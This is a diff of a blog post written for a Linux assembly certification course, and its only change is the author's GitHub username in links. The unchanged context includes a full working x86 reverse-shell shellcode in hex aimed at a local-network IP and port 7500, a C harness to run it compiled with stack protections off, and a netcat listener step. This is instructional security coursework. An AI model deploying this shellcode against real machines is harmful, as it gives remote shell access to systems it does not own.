@@ -60,7 +60,7 @@ Below there is the complete shellcode:
 
 	;Description:	Assignment #2 (Reverse_Shell_Bind_TCP, 79 bytes)
 	;Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x43\x68\xc0\xa8\x01\xa7\x66\x68\x1d\x4c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
-	;Author: 		Paolo Stivanin <https://github.com/polslinux>
+	;Author: 		Paolo Stivanin <https://github.com/paolostivanin>
 	;SLAE ID:		526
 
 	global _start
@@ -124,12 +124,12 @@ I also used [libemu](http://libemu.carnivore.it/) and dot to produce a graph of
 
 [![graph_assign2]({{ site.baseurl }}/images/2014/04/graph_assign2-601x1024.png)]({{ site.baseurl }}/images/2014/04/graph_assign2.png)
 
-To assemble, link and get the hex shellcode I used the[ same script of Assignment 1](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/alg-shell.sh).
+To assemble, link and get the hex shellcode I used the[ same script of Assignment 1](https://github.com/paolostivanin/SLAE/blob/master/utility/for-shellcode/alg-shell.sh).
 
 Before executing the program the C source file must be updated with the newest shellcode:
    
 	/* Template for running shellcode
-	* Author: Paolo Stivanin <https://github.com/polslinux>
+	* Author: Paolo Stivanin <https://github.com/paolostivanin>
 	* SLAE Student ID: 526
 	*/
 
@@ -146,7 +146,7 @@ Before executing the program the C source file must be updated with the newest s
 		return 0;
 	}
 
-Now it's time to compile the file with gcc -fno-stack-protector -z execstack main.c -o Reverse_Shell_Bind_TCP (or with [this](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then:
+Now it's time to compile the file with gcc -fno-stack-protector -z execstack main.c -o Reverse_Shell_Bind_TCP (or with [this](https://github.com/paolostivanin/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then:
 
   1. open a terminal and type nc -v -l -p 7500
 	
@@ -159,7 +159,7 @@ The last point of this assignment ask to provide an easily way to configure the 
 	#!/bin/bash
 
 	#Description:	Assignment #2 (Reverse_Shell_Bind_TCP, configure ip and port)
-	#Author: 		Paolo Stivanin <https://github.com/polslinux>
+	#Author: 		Paolo Stivanin <https://github.com/paolostivanin>
 	#SLAE ID:		526
 
 	if [ -z "$1" ]; then
@@ -192,7 +192,7 @@ The last point of this assignment ask to provide an easily way to configure the 
 
 	echo "[+] All done :)"
 
-All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).
+All the sources can be found in my [Github page](https://github.com/paolostivanin/SLAE/).
 
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
